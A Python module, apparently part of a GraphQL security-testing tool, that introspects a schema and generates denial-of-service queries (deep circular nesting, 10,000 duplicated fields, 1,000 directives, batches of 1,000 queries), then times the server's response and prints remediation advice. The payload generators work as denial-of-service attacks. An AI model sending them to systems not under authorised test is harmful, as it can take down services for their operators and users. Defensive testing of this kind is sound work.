"""
Version: 1.0
Author:Aleksa Zatezalo
Date: February 2025
Description: GraphQL DoS testing module with schema-aware query generation
"""

import asyncio
import aiohttp
from typing import Dict, List, Optional, Tuple, Any
from grapePrint import grapePrint
import time

class root():
    """
    A class for testing GraphQL endpoints for various Denial of Service vulnerabilities.
    Generates targeted queries based on introspection of the actual schema.
    """
    
    def __init__(self):
        """Initialize the DoS tester with default settings and printer."""
        self.message = grapePrint()
        self.proxy_url: Optional[str] = None
        self.schema: Optional[Dict] = None
        self.endpoint: Optional[str] = None
        self.query_type: Optional[str] = None
        self.types: Dict[str, Dict] = {}
    

    def printVulnerabilityDetails(self, vuln_type: str, is_vulnerable: bool, duration: float):
        """Print detailed information about the vulnerability test results."""
        if is_vulnerable:
            self.message.printMsg(f"Endpoint is VULNERABLE to {vuln_type}!", status="warning")
            self.message.printMsg(f"Response time: {duration:.2f} seconds", status="warning")
            
            # Print specific remediation advice based on vulnerability type
            print("\nRemediation Advice:")
            match vuln_type:
                case "Circular Query DoS":
                    print("""
    1. Implement query depth limiting
    2. Set maximum recursion depth
    3. Use query cost analysis
    4. Consider implementing persisted queries
    5. Monitor and rate limit by client IP
    
    Example configuration (for Apollo Server):
    ```
    const server = new ApolloServer({
      schema,
      validationRules: [
        depthLimit(5),
        costAnalysis({
          maximumCost: 1000,
        }),
      ],
    });
    ```
                    """)
                    
                case "Field Duplication DoS":
                    print("""
    1. Implement field count limiting
    2. Use query cost analysis
    3. Cache frequently requested fields
    4. Set maximum query complexity
    5. Consider implementing automatic field merging
    
    Example configuration:
    ```
    const server = new ApolloServer({
      schema,
      validationRules: [
        QueryComplexity({
          maximumComplexity: 1000,
          variables: {},
          onComplete: (complexity) => {
            console.log('Query Complexity:', complexity);
          },
        }),
      ],
    });
    ```
                    """)
                    
                case "Directive Overload DoS":
                    print("""
    1. Limit number of directives per query
    2. Implement directive-specific rate limiting
    3. Cache directive resolution results
    4. Set maximum directive depth
    5. Monitor directive usage patterns
    
    Example implementation:
    ```
    const directiveLimit = (maxDirectives) => ({
      Field: (node) => {
        const directiveCount = node.directives.length;
        if (directiveCount > maxDirectives) {
          throw new Error(`Query has too many directives: ${directiveCount}`);
        }
        return node;
      },
    });
    ```
                    """)
                    
                case "Object Override DoS":
                    print("""
    1. Implement object nesting limits
    2. Set maximum response size
    3. Use pagination for large objects
    4. Monitor memory usage
    5. Implement response caching
    
    Example configuration:
    ```
    const schema = makeExecutableSchema({
      typeDefs,
      resolvers,
      validationRules: [
        MaxObjectNestingRule(5),
        MaxResponseSizeRule(1000000),
      ],
    });
    ```
                    """)
                    
                case "Array Batching DoS":
                    print("""
    1. Implement batch size limits
    2. Set maximum concurrent queries
    3. Use query cost analysis for batches
    4. Implement request queuing
    5. Monitor batch processing times
    
    Example configuration:
    ```
    const server = new ApolloServer({
      schema,
      validationRules: [
        BatchLimitRule(100),
        ConcurrentQueryLimit(10),
      ],
    });
    ```
                    """)
        else:
            self.message.printMsg(f"Endpoint is NOT vulnerable to {vuln_type}", status="success")
            self.message.printMsg(f"Response time: {duration:.2f} seconds", status="success")

    def configureProxy(self, proxy_host: str, proxy_port: int):
        """Configure HTTP proxy settings."""
        self.proxy_url = f"http://{proxy_host}:{proxy_port}"

    async def runIntrospection(self, session: aiohttp.ClientSession) -> bool:
        """
        Run introspection query to get schema information.
        """
        query = """
        query IntrospectionQuery {
          __schema {
            queryType {
              name
            }
            types {
              name
              fields {
                name
                type {
                  name
                  kind
                  ofType {
                    name
                    kind
                  }
                }
              }
            }
          }
        }
        """

        try:
            async with session.post(
                self.endpoint,
                json={'query': query},
                headers={'Content-Type': 'application/json'},
                timeout=aiohttp.ClientTimeout(total=10),
                proxy=self.proxy_url,
                ssl=False
            ) as response:
                if response.status == 200:
                    result = await response.json()
                    if result.get('data'):
                        self.schema = result['data']['__schema']
                        self.query_type = self.schema['queryType']['name']
                        
                        # Process types into a more usable format
                        for type_info in self.schema['types']:
                            if type_info.get('fields'):
                                self.types[type_info['name']] = {
                                    'fields': type_info['fields']
                                }
                        
                        self.message.printMsg("Successfully retrieved schema", status="success")
                        return True
                    
            self.message.printMsg("Failed to parse introspection result", status="failed")
            return False
            
        except Exception as e:
            self.message.printMsg(f"Introspection query failed: {str(e)}", status="failed")
            return False

    def generateCircularQuery(self) -> str:
        """
        Generate a circular query based on schema types that reference each other.
        """
        if not self.schema:
            return ""

        # Find a type that has a field referencing another type
        circular_fields = []
        for type_name, type_info in self.types.items():
            for field in type_info.get('fields', []):
                field_type = field['type'].get('name') or field['type'].get('ofType', {}).get('name')
                if field_type in self.types:
                    circular_fields.append((type_name, field['name'], field_type))

        if not circular_fields:
            return ""

        # Generate nested query using the first circular reference found
        type_name, field_name, field_type = circular_fields[0]
        nested_query = f"""
            {field_name} {{
                id
                {field_name} {{
                    id
                    {field_name} {{
                        id
                        {field_name} {{
                            id
                        }}
                    }}
                }}
            }}
        """

        return f"query {{ {nested_query} }}"

    def generateFieldDuplication(self) -> str:
        """
        Generate a query with duplicated fields based on schema.
        """
        if not self.query_type or not self.types.get(self.query_type):
            return ""

        # Get all scalar fields from the query type
        scalar_fields = []
        for field in self.types[self.query_type]['fields']:
            field_type = field['type'].get('name')
            if field_type in ['String', 'Int', 'Float', 'Boolean', 'ID']:
                scalar_fields.append(field['name'])

        if not scalar_fields:
            return ""

        # Duplicate the first scalar field many times
        duplicated_field = f"{scalar_fields[0]}\n" * 10000
        return f"query {{ {duplicated_field} }}"

    def generateDirectiveOverload(self) -> str:
        """
        Generate a query with excessive directives based on schema.
        """
        if not self.query_type or not self.types.get(self.query_type):
            return ""

        # Get the first field from the query type
        first_field = next(iter(self.types[self.query_type]['fields']), None)
        if not first_field:
            return ""

        # Add many include directives
        directives = "@include(if: true) " * 1000
        return f"""
        query {{
            {first_field['name']} {directives} {{
                id
            }}
        }}
        """

    def generateObjectOverride(self) -> str:
        """
        Generate a deeply nested query based on schema types.
        """
        if not self.query_type or not self.types.get(self.query_type):
            return ""

        # Find a field that returns an object type
        object_fields = []
        for field in self.types[self.query_type]['fields']:
            field_type = field['type'].get('name') or field['type'].get('ofType', {}).get('name')
            if field_type in self.types:
                object_fields.append(field['name'])

        if not object_fields:
            return ""

        # Create deeply nested query
        nested_levels = 100
        current_query = "id"
        for _ in range(nested_levels):
            current_query = f"""
            {object_fields[0]} {{
                {current_query}
            }}
            """

        return f"query {{ {current_query} }}"

    def generateArrayBatching(self) -> List[Dict[str, str]]:
        """
        Generate a batch of queries based on schema.
        """
        if not self.query_type or not self.types.get(self.query_type):
            return []

        # Get first available field
        first_field = next(iter(self.types[self.query_type]['fields']), None)
        if not first_field:
            return []

        # Create batch of simple queries
        return [{
            "query": f"""
            query {{
                {first_field['name']} {{
                    id
                }}
            }}
            """
        } for _ in range(1000)]

    async def setEndpoint(self, endpoint: str, proxy_string: Optional[str] = None) -> bool:
        """
        Set the endpoint and retrieve its schema through introspection.
        
        Args:
            endpoint: The GraphQL endpoint URL
            proxy_string: Optional proxy in format "host:port"
            
        Returns:
            bool: True if endpoint was set and schema retrieved successfully
        """
        self.endpoint = endpoint
        
        # Configure proxy if provided
        if proxy_string:
            try:
                proxy_host, proxy_port = proxy_string.split(':')
                self.configureProxy(proxy_host, int(proxy_port))
            except ValueError:
                self.message.printMsg("Invalid proxy format. Expected host:port", status="failed")
                return False

        # Run introspection
        async with aiohttp.ClientSession() as session:
            return await self.runIntrospection(session)

    async def testCircularQuery(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
        """Test for circular query vulnerability using schema-based query."""
        query = self.generateCircularQuery()
        if not query:
            return False, 0.0

        start_time = time.time()
        try:
            async with session.post(
                self.endpoint,
                json={'query': query},
                headers={'Content-Type': 'application/json'},
                timeout=aiohttp.ClientTimeout(total=10),
                proxy=self.proxy_url,
                ssl=False
            ) as response:
                duration = time.time() - start_time
                is_vulnerable = duration > 5 or response.status == 500
                return is_vulnerable, duration
        except asyncio.TimeoutError:
            return True, 10.0
        except Exception:
            return False, 0.0

    async def testFieldDuplication(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
        """Test for field duplication vulnerability using schema-based query."""
        query = self.generateFieldDuplication()
        if not query:
            return False, 0.0

        start_time = time.time()
        try:
            async with session.post(
                self.endpoint,
                json={'query': query},
                headers={'Content-Type': 'application/json'},
                timeout=aiohttp.ClientTimeout(total=10),
                proxy=self.proxy_url,
                ssl=False
            ) as response:
                duration = time.time() - start_time
                is_vulnerable = duration > 5 or response.status == 500
                return is_vulnerable, duration
        except asyncio.TimeoutError:
            return True, 10.0
        except Exception:
            return False, 0.0

    async def testDirectiveOverload(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
        """Test for directive overloading vulnerability using schema-based query."""
        query = self.generateDirectiveOverload()
        if not query:
            return False, 0.0

        start_time = time.time()
        try:
            async with session.post(
                self.endpoint,
                json={'query': query},
                headers={'Content-Type': 'application/json'},
                timeout=aiohttp.ClientTimeout(total=10),
                proxy=self.proxy_url,
                ssl=False
            ) as response:
                duration = time.time() - start_time
                is_vulnerable = duration > 5 or response.status == 500
                return is_vulnerable, duration
        except asyncio.TimeoutError:
            return True, 10.0
        except Exception:
            return False, 0.0

    async def testObjectOverride(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
        """Test for object override vulnerability using schema-based query."""
        query = self.generateObjectOverride()
        if not query:
            return False, 0.0

        start_time = time.time()
        try:
            async with session.post(
                self.endpoint,
                json={'query': query},
                headers={'Content-Type': 'application/json'},
                timeout=aiohttp.ClientTimeout(total=10),
                proxy=self.proxy_url,
                ssl=False
            ) as response:
                duration = time.time() - start_time
                is_vulnerable = duration > 5 or response.status == 500
                return is_vulnerable, duration
        except asyncio.TimeoutError:
            return True, 10.0
        except Exception:
            return False, 0.0

    async def testArrayBatching(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
        """Test for array batching vulnerability using schema-based query."""
        queries = self.generateArrayBatching()
        if not queries:
            return False, 0.0

        start_time = time.time()
        try:
            async with session.post(
                self.endpoint,
                json=queries,
                headers={'Content-Type': 'application/json'},
                timeout=aiohttp.ClientTimeout(total=10),
                proxy=self.proxy_url,
                ssl=False
            ) as response:
                duration = time.time() - start_time
                is_vulnerable = duration > 5 or response.status == 500
                return is_vulnerable, duration
        except asyncio.TimeoutError:
            return True, 10.0
        except Exception:
            return False, 0.0

    async def testEndpointDos(self):
        """
        Test the endpoint for all DoS vulnerabilities using schema-based queries.
        """
        if not self.endpoint or not self.schema:
            self.message.printMsg("No endpoint set or schema not retrieved. Run setEndpoint first.", status="failed")
            return

        self.message.printMsg(f"Testing endpoint: {self.endpoint}", status="log")
        
        async with aiohttp.ClientSession() as session:
            tests = [
                ("Circular Query DoS", self.testCircularQuery),
                ("Field Duplication DoS", self.testFieldDuplication),
                ("Directive Overload DoS", self.testDirectiveOverload),
                ("Object Override DoS", self.testObjectOverride),
                ("Array Batching DoS", self.testArrayBatching)
            ]
            
            for vuln_type, test_func in tests:
                self.message.printMsg(f"Testing for {vuln_type}...", status="log")
                is_vulnerable, duration = await test_func(session)
                self.printVulnerabilityDetails(vuln_type, is_vulnerable, duration)
                await asyncio.sleep(1)  # Pause between tests

# async def main():
#     dos_tester = grapeDos()
    
#     # First set the endpoint and get schema
#     if await dos_tester.setEndpoint("http://127.0.0.1:5013/graphql", "127.0.0.1:8080"):
#         # Then run the DOS tests
#         await dos_tester.testEndpointDos()
#     else:
#         print("Failed to set endpoint or retrieve schema")

# if __name__ == "__main__":
#     asyncio.run(main())